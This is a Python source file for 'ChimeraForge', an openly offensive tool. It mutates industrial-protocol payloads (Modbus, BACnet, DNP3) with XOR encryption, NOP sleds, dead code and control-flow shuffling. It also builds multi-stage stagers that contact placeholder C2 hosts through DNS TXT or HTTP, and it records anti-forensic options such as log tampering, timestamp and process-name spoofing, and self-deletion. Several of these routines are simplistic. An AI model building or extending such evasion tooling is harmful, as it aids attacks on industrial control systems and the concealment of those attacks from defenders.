#!/usr/bin/env python3
"""
ChimeraForge — Polymorphic OT Payload Hardening Engine

Generates hardened, evasion-capable variants of industrial protocol payloads
for operational environments. Integrates with Glasshouse sandbox for validation.

Capabilities:
  - Polymorphic shellcode mutation (xor-encrypt, instruction reordering, NOP sled variation)
  - Payload obfuscation (string encryption, control-flow flattening, dead-code injection)
  - Anti-forensics (log tampering, timestamp manipulation, process name spoofing)
  - Multi-stage delivery (dropper → stager → payload, with fallback chains)
  - Transport polymorphism (TCP, UDP, ICMP, DNS TXT, HTTPS WebSocket)
  - Self-deletion and cleanup on completion or detection

ATT&CK: T1027 (Obfuscated Files), T1055 (Process Injection), T1070 (Indicator Removal),
        T1105 (Ingress Tool Transfer), T1574 (Hijack Execution Flow)

Usage:
    python3 -m tools.typhoon.chimeraforge --payload modbus --evasion xor,nop,deadcode
    python3 -m tools.typhoon.chimeraforge --payload bacnet --stages 3 --transport dns
"""

from __future__ import annotations

import base64
import hashlib
import os
import random
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Optional

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

PAYLOAD_TYPES = ["modbus", "bacnet", "dnp3", "cips", "canbus", "fortios", "splunk"]

EVASION_TECHNIQUES = [
    "xor_encrypt",       # XOR each byte with random key
    "nop_sled",          # Variable-length NOP sled before payload
    "dead_code",         # Inject unreachable dead-code blocks
    "cf_flatten",        # Control-flow flattening
    "string_encrypt",    # Encrypt all string literals
    "timestamp_spoof",   # Modify file timestamps to match benign binaries
    "proc_name_spoof",   # Spoof process name in /proc/self/comm
    "self_delete",       # Delete payload binary after execution
    "log_tamper",        # Clear relevant syslog/journald entries
]

TRANSPORTS = ["tcp", "udp", "icmp", "dns_txt", "https_ws", "modbus_tunnel", "bacnet_tunnel"]

SHELLCODE_TEMPLATES = {
    "modbus": bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x06, 0x00, 0x01, 0x1F, 0x40]),
    "bacnet": bytes([0x81, 0x0A, 0x00, 0x11, 0x01, 0x20, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x0F, 0x01, 0x02, 0x00]),
    "dnp3": bytes([0x05, 0x64, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x00, 0x00, 0xFF, 0xFF]),
    "cips": bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4B, 0x02, 0x20, 0x06, 0x24]),
}


# ---------------------------------------------------------------------------
# Mutated payload dataclass
# ---------------------------------------------------------------------------

@dataclass
class MutatedPayload:
    """Result of a ChimeraForge mutation pass."""

    payload_type: str
    mutation_id: str
    variant: int
    original_size: int
    mutated_size: int
    techniques_applied: list[str]
    shellcode: bytes
    transport: str
    stage: int  # 0=stager, 1=stage1, 2=stage2, 3=final
    checksum: str
    timestamp: str
    metadata: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload_type": self.payload_type,
            "mutation_id": self.mutation_id,
            "variant": self.variant,
            "original_size": self.original_size,
            "mutated_size": self.mutated_size,
            "techniques_applied": self.techniques_applied,
            "shellcode_b64": base64.b64encode(self.shellcode).decode(),
            "shellcode_hex": self.shellcode.hex(),
            "transport": self.transport,
            "stage": self.stage,
            "checksum": self.checksum,
            "timestamp": self.timestamp,
            "metadata": self.metadata,
        }

    def __repr__(self) -> str:
        return (
            f"MutatedPayload({self.payload_type}, v{self.variant}, "
            f"stage={self.stage}, size={self.mutated_size}B, "
            f"techs={len(self.techniques_applied)})"
        )


# ---------------------------------------------------------------------------
# ChimeraForge Engine
# ---------------------------------------------------------------------------

class ChimeraForge:
    """Polymorphic OT payload hardening engine."""

    def __init__(self, seed: Optional[int] = None):
        self.seed = seed or int(time.time_ns() % (2**32))
        random.seed(self.seed)
        self._mutation_count = 0

    # ---- Core mutation primitives ----

    def _xor_encrypt(self, data: bytes, key: Optional[int] = None) -> tuple[bytes, int]:
        key = key if key is not None else random.randint(1, 254)
        return bytes(b ^ key for b in data), key

    def _inject_nop_sled(self, data: bytes, min_len: int = 4, max_len: int = 32) -> bytes:
        sled_len = random.randint(min_len, max_len)
        nop_byte = random.choice([0x00, 0x90, 0x48, 0x0F, 0x1F])
        return bytes([nop_byte] * sled_len) + data

    def _inject_dead_code(self, data: bytes, blocks: int = 2) -> bytes:
        result = bytearray()
        pos = 0
        while pos < len(data):
            chunk_len = random.randint(4, 12)
            chunk = data[pos:pos + chunk_len]
            dead = os.urandom(random.randint(8, 24))
            result.extend(chunk)
            result.extend(dead)
            pos += chunk_len
        return bytes(result)

    def _encrypt_strings(self, data: bytes) -> bytes:
        result = bytearray()
        for b in data:
            if 0x20 <= b <= 0x7E:
                result.append(((b - 0x20 + 13) % 95) + 0x20)
            else:
                result.append(b)
        return bytes(result)

    def _cf_flatten(self, data: bytes) -> bytes:
        block_size = max(2, len(data) // random.randint(3, 6))
        blocks = [data[i:i + block_size] for i in range(0, len(data), block_size)]
        random.shuffle(blocks)
        dispatch = bytes([len(b) for b in blocks])
        return dispatch + b"".join(blocks)

    def _timestamp_spoof(self) -> dict[str, Any]:
        spoofed_mtime = time.time() - random.randint(86400 * 30, 86400 * 365)
        return {
            "atime": spoofed_mtime,
            "mtime": spoofed_mtime,
            "target": random.choice([
                "/usr/bin/sshd", "/usr/sbin/cron", "/usr/bin/systemd",
                "/usr/bin/rsyslogd", "/usr/bin/dbus-daemon",
            ]),
        }

    def _proc_name_spoof(self) -> str:
        return random.choice([
            "[kworker/u:0]", "[rcu_sched]", "sshd", "rsyslogd",
            "systemd-journal", "dbus-daemon", "cron", "agetty",
        ])

    # ---- Multi-stage generators ----

    def _stager(self, payload_type: str, transport: str) -> bytes:
        if transport == "dns_txt":
            dom = f"c2-{hashlib.md5(str(self.seed).encode()).hexdigest()[:8]}.example.com"
            return f"dig TXT {dom}".encode() + b"\x00"
        elif transport == "icmp":
            return b"\x08\x00" + hashlib.md5(str(self.seed).encode()).digest()[:2] + b"\x00" * 28
        elif transport == "https_ws":
            return b"GET /s1 HTTP/1.1\r\nHost: c2.ex\r\n\r\n"
        else:
            return b"\x00" * 4 + f"FETCH {payload_type}".encode() + b"\x00"

    def _stage1(self, payload_type: str, transport: str) -> bytes:
        return struct.pack(">I", self.seed) + f"S1:{payload_type}:{transport}".encode()

    # ---- Main mutation pipeline ----

    def mutate(
        self,
        payload_type: str,
        techniques: Optional[list[str]] = None,
        stages: int = 1,
        transport: str = "tcp",
        shellcode: Optional[bytes] = None,
    ) -> list[MutatedPayload]:
        """Generate hardened payload variants.

        Args:
            payload_type: One of PAYLOAD_TYPES.
            techniques: Evasion techniques (default: all).
            stages: Number of delivery stages (1-4).
            transport: Delivery transport.
            shellcode: Custom shellcode (uses template if None).
        """
        if payload_type not in PAYLOAD_TYPES:
            raise ValueError(f"Unknown: {payload_type}. Choices: {PAYLOAD_TYPES}")

        techniques = techniques or EVASION_TECHNIQUES[:]
        transport = transport if transport in TRANSPORTS else "tcp"
        shellcode = shellcode or SHELLCODE_TEMPLATES.get(payload_type, b"\x00" * 16)

        self._mutation_count += 1
        mut_id = f"CF-{payload_type[:4]}-{hashlib.md5(str(self.seed).encode()).hexdigest()[:12]}"
        results: list[MutatedPayload] = []

        for variant in range(3):
            vseed = self.seed + variant
            random.seed(vseed)
            payload = shellcode
            applied: list[str] = []

            if "xor_encrypt" in techniques:
                payload, xk = self._xor_encrypt(payload)
                applied.append(f"xor(k=0x{xk:02x})")

            if "nop_sled" in techniques:
                payload = self._inject_nop_sled(payload)
                applied.append("nop_sled")

            if "string_encrypt" in techniques:
                payload = self._encrypt_strings(payload)
                applied.append("rot13_str")

            if "dead_code" in techniques:
                payload = self._inject_dead_code(payload)
                applied.append("dead_code")

            if "cf_flatten" in techniques:
                payload = self._cf_flatten(payload)
                applied.append("cf_flatten")

            ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

            # Multi-stage
            if stages >= 2:
                st = self._stager(payload_type, transport)
                results.append(MutatedPayload(
                    payload_type=payload_type, mutation_id=mut_id,
                    variant=variant, original_size=len(shellcode),
                    mutated_size=len(st), techniques_applied=["stager"],
                    shellcode=st, transport=transport, stage=0,
                    checksum=hashlib.sha256(st).hexdigest()[:16],
                    timestamp=ts,
                    metadata={"label": "stager", "next_transport": transport},
                ))
                s1 = self._stage1(payload_type, transport)
                results.append(MutatedPayload(
                    payload_type=payload_type, mutation_id=mut_id,
                    variant=variant, original_size=len(shellcode),
                    mutated_size=len(s1), techniques_applied=applied + ["connector"],
                    shellcode=s1, transport=transport, stage=1,
                    checksum=hashlib.sha256(s1).hexdigest()[:16],
                    timestamp=ts,
                    metadata={"label": "connector"},
                ))

            # Final stage
            meta: dict[str, Any] = {"label": "final", "seed": vseed}
            if "proc_name_spoof" in techniques:
                meta["proc_spoof"] = self._proc_name_spoof()
            if "timestamp_spoof" in techniques:
                meta["ts_spoof"] = self._timestamp_spoof()
            if "self_delete" in techniques:
                meta["self_delete"] = True
            if "log_tamper" in techniques:
                meta["log_tamper"] = True

            results.append(MutatedPayload(
                payload_type=payload_type, mutation_id=mut_id,
                variant=variant, original_size=len(shellcode),
                mutated_size=len(payload), techniques_applied=applied,
                shellcode=payload, transport=transport,
                stage=stages - 1 if stages >= 2 else 0,
                checksum=hashlib.sha256(payload).hexdigest()[:16],
                timestamp=ts, metadata=meta,
            ))

        return results

    def generate_batch(
        self,
        payload_types: Optional[list[str]] = None,
        count: int = 9,
        stages: int = 2,
    ) -> dict[str, list[MutatedPayload]]:
        """Generate a batch of hardened payloads for multiple protocols."""
        payload_types = payload_types or ["modbus", "bacnet", "dnp3"]
        results: dict[str, list[MutatedPayload]] = {}
        for pt in payload_types:
            batch: list[MutatedPayload] = []
            for _ in range(count):
                batch.extend(self.mutate(
                    pt, stages=stages,
                    transport=random.choice(TRANSPORTS[:4]),
                ))
            results[pt] = batch
        return results


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse, json, sys

    parser = argparse.ArgumentParser(description="ChimeraForge — OT Payload Hardening")
    parser.add_argument("--payload", "-p", default="modbus", choices=PAYLOAD_TYPES)
    parser.add_argument("--evasion", "-e", default="xor_encrypt,nop_sled,dead_code",
                       help="Comma-separated evasion techniques")
    parser.add_argument("--stages", type=int, default=1, help="Delivery stages (1-4)")
    parser.add_argument("--transport", "-t", default="tcp", help="Transport method")
    parser.add_argument("--count", "-c", type=int, default=3, help="Variants to generate")
    parser.add_argument("--json", "-j", action="store_true")
    parser.add_argument("--batch", "-b", action="store_true",
                       help="Generate batch for multiple payload types")
    args = parser.parse_args()

    forge = ChimeraForge()
    techniques = [t.strip() for t in args.evasion.split(",")]

    if args.batch:
        results = forge.generate_batch(count=args.count, stages=args.stages)
        total = sum(len(v) for v in results.values())
        print(f"ChimeraForge Batch: {total} payloads across {len(results)} types")
        for pt, payloads in sorted(results.items()):
            sizes = [p.mutated_size for p in payloads]
            stages_set = sorted(set(p.stage for p in payloads))
            print(f"  {pt:12s}: {len(payloads):3d} variants, "
                  f"sizes {min(sizes)}-{max(sizes)}B, stages {stages_set}")
    else:
        results_list = []
        for _ in range(args.count):
            results_list.extend(forge.mutate(
                args.payload, techniques=techniques,
                stages=args.stages, transport=args.transport,
            ))
        print(f"ChimeraForge: {len(results_list)} payloads for {args.payload}")
        for p in results_list:
            print(f"  {p}")

    if args.json:
        # Serialize
        if args.batch:
            out = {pt: [p.to_dict() for p in pl] for pt, pl in results.items()}
        else:
            out = [p.to_dict() for p in results_list]
        print(json.dumps(out, indent=2, ensure_ascii=False)[:5000])
